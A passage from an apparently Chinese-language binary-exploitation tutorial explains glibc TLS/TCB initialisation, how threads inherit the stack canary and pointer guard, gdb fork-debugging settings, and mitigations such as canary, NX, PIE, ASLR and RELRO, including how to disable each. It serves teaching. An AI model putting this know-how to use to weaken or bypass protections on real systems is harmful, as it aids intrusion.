<strong>TCB</strong> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Align the TCB offset to the maximum alignment, as</span></span><br><span class="line"><span class="comment">   _dl_allocate_tls_storage (in elf/dl-tls.c) does using __libc_memalign</span></span><br><span class="line"><span class="comment">   and dl_tls_static_align.  */</span></span><br><span class="line">tcb_offset = roundup (memsz + GLRO(dl_tls_static_surplus), max_align);</span><br><span class="line">tlsblock = __sbrk(tcb_offset + TLS_INIT_TCB_SIZE + max_align);</span><br></pre></td></tr></table></figure></div> <code>tcbhead_t</code>
结构体定义如下，也就是很多资料中提到的 TLS 。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *tcb;		<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">			   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;		<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line"><span class="meta"># <span class="keyword">ifndef</span> __ASSUME_PRIVATE_FUTEX</span></span><br><span class="line">  <span class="type">int</span> private_futex;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> __glibc_reserved1;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> __glibc_reserved2;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((<span class="built_in">aligned</span> (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure></div> 之后初始化
<code>_dl_static_dtv</code> ，也就是前面提到的 <strong><code>dtv</code>
数组</strong>，具体过程为： - 将 <code>tlsblock</code> 地址关于
<code>max_align</code> 向上对齐。 -
<code>_dl_static_dtv[0].counter</code> 初始化为 <code>dtv</code>
的数量，由于 <code>_dl_static_dtv</code> 前两项分别用于记录
<code>dtv</code> 总数和使用的数量，因此这里记录的 <code>dtv</code>
数量是要减去这两项的。 - <code>_dl_static_dtv[1].counter</code> 初始化为
0 。 - <code>_dl_static_dtv[2]</code> 也就是当前模块对应的
<code>dtv</code> 的 <code>pointer.val</code> 指向 TLS 。 -
<code>_dl_static_dtv[2].pointer.to_free</code> 置为 NULL 。 - 将 TLS
的初始数据也就是 <code>PT_TLS</code> 段中的数据复制到 TLS 中。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtv_pointer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *val;                    <span class="comment">/* Pointer to data, or TLS_DTV_UNALLOCATED.  */</span></span><br><span class="line">  <span class="type">void</span> *to_free;                <span class="comment">/* Unaligned pointer, for deallocation.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type for the dtv.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">dtv</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">size_t</span> counter;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtv_pointer</span> <span class="title">pointer</span>;</span></span><br><span class="line">&#125; <span class="type">dtv_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Number of additional entries in the slotinfo array of each slotinfo</span></span><br><span class="line"><span class="comment">   list element.  A large number makes it almost certain take we never</span></span><br><span class="line"><span class="comment">   have to iterate beyond the first element in the slotinfo list.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TLS_SLOTINFO_SURPLUS (62)</span></span><br><span class="line"><span class="type">dtv_t</span> _dl_static_dtv[<span class="number">2</span> + TLS_SLOTINFO_SURPLUS];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Align the TLS block.  */</span></span><br><span class="line">    tlsblock = (<span class="type">void</span> *) (((<span class="type">uintptr_t</span>) tlsblock + max_align - <span class="number">1</span>)</span><br><span class="line">                         &amp; ~(max_align - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the dtv.  [0] is the length, [1] the generation counter.  */</span></span><br><span class="line">    _dl_static_dtv[<span class="number">0</span>].counter = (<span class="keyword">sizeof</span>(_dl_static_dtv) / <span class="keyword">sizeof</span>(_dl_static_dtv[<span class="number">0</span>])) - <span class="number">2</span>;</span><br><span class="line">    <span class="comment">// _dl_static_dtv[1].counter = 0;		would be needed if not already done</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the TLS block.  */</span></span><br><span class="line">    _dl_static_dtv[<span class="number">2</span>].pointer.val = ((<span class="type">char</span> *) tlsblock + tcb_offset</span><br><span class="line">                                     - roundup (memsz, align ?: <span class="number">1</span>));</span><br><span class="line">    _dl_static_dtv[<span class="number">2</span>].pointer.to_free = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/* sbrk gives us zero&#x27;d memory, so we don&#x27;t need to clear the remainder.  */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(_dl_static_dtv[<span class="number">2</span>].pointer.val, initimage, filesz);</span><br></pre></td></tr></table></figure></div> 此时 TLS 相关结构之间的关系如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108005415665.png"
                     
alt="image-20241108005415665" 
                > 另外还会初始化 <code>link_map</code>
中的 TLS 相关的数据，由此我们可以知道 <code>link_map</code>
中这些字段的含义：</p>
<ul>
<li><code>l_tls_offset</code>：TCB 在 TLS 中的偏移。</li>
<li><code>l_tls_align</code>：TLS 初始数据的对齐，在 TLS 中 TLS
初始数据关于 <code>l_tls_align</code> 向上取整。</li>
<li><code>l_tls_blocksize</code>：TLS 初始数据的大小，也就是前面提到的
TLS Block 的大小。</li>
<li><code>l_tls_initimage</code>：TLS 初始数据的地址。也就是
<code>PT_TLS</code> 段的地址。</li>
<li><code>l_tls_initimage_size</code>：<code>PT_TLS</code>
段在文件中的大小，也就是 <code>.tdata</code> 的大小。</li>
<li><code>l_tls_modid</code>：模块编号。</li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">main_map</span> =</span> GL(dl_ns)[LM_ID_BASE]._ns_loaded;</span><br><span class="line">main_map-&gt;l_tls_offset = roundup (memsz, align ?: <span class="number">1</span>);</span><br><span class="line"><span class="comment">/* Update the executable&#x27;s link map with enough information to make</span></span><br><span class="line"><span class="comment">   the TLS routines happy.  */</span></span><br><span class="line">main_map-&gt;l_tls_align = align;</span><br><span class="line">main_map-&gt;l_tls_blocksize = memsz;</span><br><span class="line">main_map-&gt;l_tls_initimage = initimage;</span><br><span class="line">main_map-&gt;l_tls_initimage_size = filesz;</span><br><span class="line">main_map-&gt;l_tls_modid = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>
<h2 id="创建线程时-tls-初始化">创建线程时 TLS 初始化</h2>
<p>创建线程的函数 <code>pthread_create</code> 实际调用的是
<code>__pthread_create_2_1</code> 函数，在该函数中调用了
<code>allocate_stack</code> 函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> ALLOCATE_STACK(attr, pd) allocate_stack (attr, pd, &amp;stackaddr)</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pthread</span> *<span class="title">pd</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> err = ALLOCATE_STACK (iattr, &amp;pd);</span><br></pre></td></tr></table></figure></div>
<p>在 <code>allocate_stack</code> 函数中会调用 <code>mmap</code>
为线程分配栈空间，然后初始化栈底为一个 <code>pthread</code>
结构体并将指针 <code>pd</code> 指向该结构体。最后调用
<code>_dl_allocate_tls</code> 函数为 TCB 创建 <code>dtv</code> 数组。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pthread</span> *<span class="title">pd</span>;</span></span><br><span class="line">...</span><br><span class="line">  mem = __mmap (<span class="literal">NULL</span>, size, (guardsize == <span class="number">0</span>) ? prot : PROT_NONE,</span><br><span class="line">	MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  ...</span><br><span class="line">  pd = (<span class="keyword">struct</span> pthread *) ((((<span class="type">uintptr_t</span>) mem + size) - TLS_TCB_SIZE) &amp; ~__static_tls_align_m1);</span><br><span class="line">...</span><br><span class="line">_dl_allocate_tls (TLS_TPADJ (pd))</span><br></pre></td></tr></table></figure></div> <code>_dl_allocate_tls</code> 函数依次调用
<code>allocate_dtv</code> 和 <code>_dl_allocate_tls_init</code>
分配和初始化 <code>dtv</code> 数组。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">_dl_allocate_tls (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> _dl_allocate_tls_init (mem == <span class="literal">NULL</span></span><br><span class="line">				? _dl_allocate_tls_storage ()</span><br><span class="line">				: allocate_dtv (mem));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<code>allocate_dtv</code> 函数调用了 ptmalloc 堆管理器的
<code>calloc</code> 函数为 <code>dtv</code> 数组分配内存，初始化
<code>dtv[0].counter</code> 为数组中元素数量，并且让
<code>pd-&gt;dtv</code> 指向 <code>dtv[1]</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Install the dtv pointer.  The pointer passed is to the element with</span></span><br><span class="line"><span class="comment">   index -1 which contain the length.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> INSTALL_DTV(descr, dtvp) \</span></span><br><span class="line"><span class="meta">  ((tcbhead_t *) (descr))-&gt;dtv = (dtvp) + 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">allocate_dtv</span> <span class="params">(<span class="type">void</span> *result)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">size_t</span> dtv_length;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We allocate a few more elements in the dtv than are needed for the</span></span><br><span class="line"><span class="comment">     initial set of modules.  This should avoid in most cases expansions</span></span><br><span class="line"><span class="comment">     of the dtv.  */</span></span><br><span class="line">  dtv_length = GL(dl_tls_max_dtv_idx) + DTV_SURPLUS;</span><br><span class="line">  dtv = <span class="built_in">calloc</span> (dtv_length + <span class="number">2</span>, <span class="keyword">sizeof</span> (<span class="type">dtv_t</span>));</span><br><span class="line">  <span class="keyword">if</span> (dtv != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This is the initial length of the dtv.  */</span></span><br><span class="line">      dtv[<span class="number">0</span>].counter = dtv_length;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The rest of the dtv (including the generation counter) is</span></span><br><span class="line"><span class="comment">	 Initialize with zero to indicate nothing there.  */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Add the dtv to the thread data structures.  */</span></span><br><span class="line">      INSTALL_DTV (result, dtv);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<code>_dl_allocate_tls_init</code> 函数会遍历
<code>dl_tls_dtv_slotinfo_list</code> 中的 <code>link_map</code>
，初始化 <code>dtv</code> 数组并将初始数据复制到 TLS
变量中。<strong>从这里可以看出，如果一个模块有 TLS 变量，则该模块对应的
<code>dtv-&gt;pointer.val</code> 指向 TLS 变量的起始地址。</strong>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">dtv[<span class="built_in">map</span>-&gt;l_tls_modid].pointer.val = TLS_DTV_UNALLOCATED;</span><br><span class="line">dtv[<span class="built_in">map</span>-&gt;l_tls_modid].pointer.to_free = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>-&gt;l_tls_offset == NO_TLS_OFFSET</span><br><span class="line">    || <span class="built_in">map</span>-&gt;l_tls_offset == FORCED_DYNAMIC_TLS_OFFSET)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* Set up the DTV entry.  The simplified __tls_get_addr that</span></span><br><span class="line"><span class="comment">   some platforms use in static programs requires it.  */</span></span><br><span class="line">dtv[<span class="built_in">map</span>-&gt;l_tls_modid].pointer.val = dest;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Copy the initialization image and clear the BSS part.  */</span></span><br><span class="line"><span class="built_in">memset</span>(__mempcpy (dest, <span class="built_in">map</span>-&gt;l_tls_initimage,</span><br><span class="line">                  <span class="built_in">map</span>-&gt;l_tls_initimage_size), <span class="string">&#x27;\0&#x27;</span>,</span><br><span class="line">       <span class="built_in">map</span>-&gt;l_tls_blocksize - <span class="built_in">map</span>-&gt;l_tls_initimage_size);</span><br></pre></td></tr></table></figure></div> 回到 <code>__pthread_create_2_1</code> 函数，在完成了
<code>pthread</code> 的一系列初始化后调用了
<code>THREAD_COPY_STACK_GUARD</code> 和
<code>THREAD_COPY_POINTER_GUARD</code> 两个宏，这两个宏的展开如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">((pd)-&gt;header.stack_guard = (&#123;</span><br><span class="line">    __typeof((&#123;</span><br><span class="line">        <span class="keyword">struct</span> pthread *__self;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;mov %%fs:%c1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__self):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.self)))));</span><br><span class="line">        __self;</span><br><span class="line">    &#125;)-&gt;header.stack_guard) __value;</span><br><span class="line">    <span class="keyword">_Static_assert</span>(<span class="keyword">sizeof</span>(__value) == <span class="number">1</span> || <span class="keyword">sizeof</span>(__value) == <span class="number">4</span> || <span class="keyword">sizeof</span>(__value) == <span class="number">8</span>, <span class="string">&quot;size of per-thread data&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">sizeof</span>(__value) == <span class="number">1</span>)<span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movb %%fs:%P2,%b0&quot;</span>:<span class="string">&quot;=q&quot;</span>(__value):<span class="string">&quot;0&quot;</span>(<span class="number">0</span>), <span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.stack_guard))))); <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">sizeof</span>(__value) == <span class="number">4</span>)<span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movl %%fs:%P1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__value):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.stack_guard))))); <span class="keyword">else</span> &#123; <span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movq %%fs:%P1,%q0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__value):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.stack_guard))))); &#125;</span><br><span class="line">    __value;</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">((pd)-&gt;header.pointer_guard = (&#123;</span><br><span class="line">    __typeof((&#123;</span><br><span class="line">        <span class="keyword">struct</span> pthread *__self;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;mov %%fs:%c1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__self):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.self)))));</span><br><span class="line">        __self;</span><br><span class="line">    &#125;)-&gt;header.pointer_guard) __value;</span><br><span class="line">    <span class="keyword">_Static_assert</span>(<span class="keyword">sizeof</span>(__value) == <span class="number">1</span> || <span class="keyword">sizeof</span>(__value) == <span class="number">4</span> || <span class="keyword">sizeof</span>(__value) == <span class="number">8</span>, <span class="string">&quot;size of per-thread data&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">sizeof</span>(__value) == <span class="number">1</span>)<span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movb %%fs:%P2,%b0&quot;</span>:<span class="string">&quot;=q&quot;</span>(__value):<span class="string">&quot;0&quot;</span>(<span class="number">0</span>), <span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.pointer_guard))))); <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">sizeof</span>(__value) == <span class="number">4</span>)<span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movl %%fs:%P1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__value):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.pointer_guard))))); <span class="keyword">else</span> &#123; <span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movq %%fs:%P1,%q0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__value):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.pointer_guard))))); &#125;</span><br><span class="line">    __value;</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure></div>
<p>不难看出这两个宏把当前线程（当前 fs 寄存器还没有指向新线程的 TCB）的
TLS 中的 <code>stack_guard</code> 和 <code>pointer_guard</code>
都复制到子线程的 TLS 的对应位置上。<strong>因此可以确定线程的
<code>stack_guard</code> 和 <code>pointer_guard</code>
与主线程相同。</strong></p>
<p>最后需要确定是 fs 寄存器何时被修改，因为 fs
寄存器不能再用户态修改，因此一定是一个系统调用完成了对 fs
寄存器的修改。</p>
<p>通过调试发现，<code>pthread_create-&gt;create_thread-&gt;clone</code>
中的 <code>clone</code> 系统调用完成了对 fs 寄存器的修改。 # 子进程调试
gdb默认情况下，父进程 <code>fork</code> 一个子进程，gdb
只会继续调试父进程而不会管子进程的运行（pwndbg 插件设置相反）。 ##
相关设置 - 跟踪子进程进行调试，可以使用
<code>set follow-fork-mode mode</code> 来设置 <code>fork</code>
跟随模式。 - <code>show follow-fork-mode</code>：进入 gdb
以后，我们可以使用 <code>show follow-fork-mode</code>
来查看目前的跟踪模式。 - <code>set follow-fork-mode parent</code>：gdb
只跟踪父进程，不跟踪子进程，这是默认的模式。 -
<code>set follow-fork-mode child</code>：gdb
在子进程产生以后只跟踪子进程，放弃对父进程的跟踪。 -
想同时调试父进程和子进程，以上的方法就不能满足了。Linux 提供了
<code>set detach-on-fork mode</code> 命令来供我们使用。 -
<code>show detach-on-fork</code>：<code>show detach-on-fork</code>
显示了目前是的 <code>detach-on-fork</code> 模式。 -
<code>set detach-on-fork on</code>：只调试父进程或子进程的其中一个（根据
<code>follow-fork-mode</code> 来决定），这是默认的模式。 -
<code>set detach-on-fork off</code>：父子进程都在 gdb
的控制之下，其中一个进程正常调试（根据 <code>follow-fork-mode</code>
来决定），另一个进程会被设置为暂停状态。 ## 调试进程切换 使用 gdb
调试多进程时，如果想要在进程间进行切换，那么就需要 - 在
<code>fork</code> 调用前设置： <code>set detach-on-fork off</code>。 -
使用 <code>info inferiors</code>
来查看进程信息，得到的信息可以看到最前面有一个进程编号，使用
<code>inferior num</code> 来进行进程切换。 # 常见保护 checksec
可以查看程序开启了哪些保护。 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ checksec /bin/ls                                   </span><br><span class="line">[*] <span class="string">&#x27;/bin/ls&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure></div> ## Canary canary
是一种防止缓冲区溢出攻击的保护机制。它的基本思想是在程序的堆栈中插入一个随机生成的数值，用于检测缓冲区溢出攻击。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001189 endbr64</span><br><span class="line">.text:000000000000118D push    rbp</span><br><span class="line">.text:000000000000118E mov     rbp, rsp</span><br><span class="line">.text:0000000000001191 sub     rsp, 30h</span><br><span class="line">.text:0000000000001195 mov     rax, fs:28h</span><br><span class="line">.text:000000000000119E mov     [rbp-8], rax</span><br><span class="line">...</span><br><span class="line">.text:00000000000011CE mov     rdx, [rbp-8]</span><br><span class="line">.text:00000000000011D2 xor     rdx, fs:28h</span><br><span class="line">.text:00000000000011DB jz      short locret_11E2</span><br><span class="line">.text:00000000000011DB</span><br><span class="line">.text:00000000000011DD call    ___stack_chk_fail</span><br><span class="line">.text:00000000000011DD</span><br><span class="line">.text:00000000000011E2 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000011E2</span><br><span class="line">.text:00000000000011E2 locret_11E2:                            ; CODE XREF: f+52↑j</span><br><span class="line">.text:00000000000011E2 leave</span><br><span class="line">.text:00000000000011E3 retn</span><br></pre></td></tr></table></figure></div>
<p>canary 的初始值存储在 tls 中，也就是前面提到的
<code>stack_guard</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108005826545.png"
                     
alt="image-20241108005826545" 
                > 在编译 c 程序时使用
<code>-fno-stack-protector</code> 参数可以关闭 canary 保护（注意高版本的
gcc 的 canary 保护关不掉)。</p>
<h2 id="nx">NX</h2>
<p>NX 即 No-eXecute（不可执行），NX
的基本原理是将数据所在内存页标识为不可执行，也就是同一内存可写与可执行不共存。</p>
<p>gcc 编译器默认开启了 NX 选项，如果需要关闭 NX 选项，可以给 gcc
编译器添加 <code>-zexecstack</code> 参数。 ## PIE PIE
主要随机了代码段（<code>.text</code>），初始化数据段（<code>.data</code>）和未初始化数据段（<code>.bss</code>）的地址。另外
PIE 是否开启还会影响堆的基址。 - 开启 PIE：</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108005851039.png"
                     
alt="image-20241108005851039" 
                >
<figcaption aria-hidden="true">image-20241108005851039</figcaption>
</figure>
<ul>
<li><p>关闭 PIE：</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108005913715.png"
                     
alt="image-20241108005913715" 
                >
<figcaption aria-hidden="true">image-20241108005913715</figcaption>
</figure></li>
</ul>
<p>在编译 c 程序时使用 <code>-no-pie</code> 参数可以关闭 PIE 保护。 ##
ASLR ASLR 是系统级别的地址随机。通过修改
<code>/proc/sys/kernel/randomize_va_space</code> 的值可以控制 ASLR
的级别： - 0：关闭 ASLR - 1：栈基址，共享库，mmap 基址随机 - 2：在 1
的基础上增加堆基址的随机</p>
<h2 id="relro">RELRO</h2>
<ul>
<li>当 RELRO 保护为 NO RELRO 的时候，<code>init.array</code>
、<code>fini.array</code> 、<code>got.plt</code> 均可读可写。</li>
<li>为 PARTIAL RELRO 的时候，<code>init.array</code>
、<code>fini.array</code>
根据实际调试结果判断是否可写，<code>got.plt</code> 可读可写。</li>
<li>为 FULL RELRO 时，<code>init.array</code> 、<code>fini.array</code>
、<code>got.plt</code> 均可读不可写。</li>
<li><code>-Wl,-z,norelro</code> 编译参数可以关闭 RELRO ，使 RELRO
状态变为 NO RELRO 。</li>
<li><code>-Wl,-z,lazy</code> 会开启延迟绑定，使 RELRO 状态变为 Partial
RELRO 。 # 调用约定 ## 栈结构</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108005938556.png"
                     
alt="image-20241108005938556" 
                > <strong>注意 canary 不一定与 ebp
相邻，因为有些函数会先将一些寄存器保存到栈中。canary
实际位置以调试为准。</strong></p>
<h2 id="函数调用过程">函数调用过程</h2>
<p>32位为例： <span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>push args</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>call func</mtext><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>push next_eip</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>jmp func</mtext></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>push ebp</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>mov ebp,esp</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>leave</mtext><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>mov esp,ebp</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>pop ebp</mtext></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>ret (pop eip)</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">
\begin{align*}
&amp; \text{push args}\\
&amp; \text{call func}\left\{\begin{matrix}
\text{push next\_eip}\\ 
\text{jmp func}
\end{matrix}\right.\\
&amp; \text{push ebp}\\
&amp; \text{mov ebp,esp}\\
&amp; \vdots \\
&amp; \text{leave}\left\{\begin{matrix}
\text{mov esp,ebp}\\ 
\text{pop ebp}
\end{matrix}\right.\\
&amp;\text{ret}\ \text{(pop eip)}
\end{align*}
